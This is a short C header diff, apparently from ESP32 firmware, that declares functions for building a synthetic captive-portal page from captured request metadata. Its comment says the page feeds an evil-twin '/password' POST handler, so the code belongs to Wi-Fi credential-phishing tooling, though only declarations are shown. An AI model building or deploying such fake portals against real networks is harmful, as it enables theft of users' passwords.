@@ -15,6 +15,7 @@
 #define OTA_PROV_MAX_PREVIEW 24
 #define OTA_PROV_DEFAULT_PCAP_BYTES (256U * 1024U)
 #define OTA_PROV_MAX_PCAP_BYTES (1024U * 1024U)
+#define OTA_PROV_PORTAL_HTML_MAX 4096
 
 typedef struct {
     uint8_t channel;
@@ -55,5 +56,17 @@ const char *ota_provision_get_preview_json(void);
 const char *ota_provision_get_summary_json(void);
 esp_err_t ota_provision_get_pcap(const uint8_t **data, size_t *size);
 void ota_provision_clear(void);
+
+/**
+ * Build a synthetic captive-portal page from captured request metadata.
+ * Uses field names only — captured values are never copied into HTML.
+ * Compatible with evil twin's /password POST handler (password-like fields
+ * are posted as name="password").
+ */
+esp_err_t ota_provision_build_portal(void);
+bool ota_provision_has_portal(void);
+const char *ota_provision_get_portal_html(void);
+const char *ota_provision_get_portal_wrong_html(void);
+cJSON *ota_provision_get_portal_meta_json(void);
 
 #endif /* OTA_PROVISION_H */
